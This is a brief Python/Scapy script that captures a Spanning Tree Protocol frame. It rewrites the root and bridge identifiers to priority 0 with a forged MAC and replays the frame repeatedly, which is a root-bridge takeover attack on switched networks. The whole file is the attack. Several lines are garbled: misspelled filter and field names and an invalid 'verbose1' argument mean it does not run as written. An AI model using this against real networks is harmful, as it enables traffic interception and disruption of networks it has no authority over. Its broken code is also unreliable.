from scapy.all import *

# capture STP frame
pkt = sniff(filter="eather dst 01:80:c2:00:00:00", count=1)

pkt[0].scr = "00:00:00:00:00:01"
pkt[0].rootid = 0
pkt[0].rootmac = "00:00:00:00:00:01"
pkt[0].brifgeid = 0
pkt[0].bridgemac = "00:00:00:00:00:01"

pkt[0].show()

for i in range(0, 50):
    sendp(pkt[0], loop=0, verbose1)
    time.sleep(1)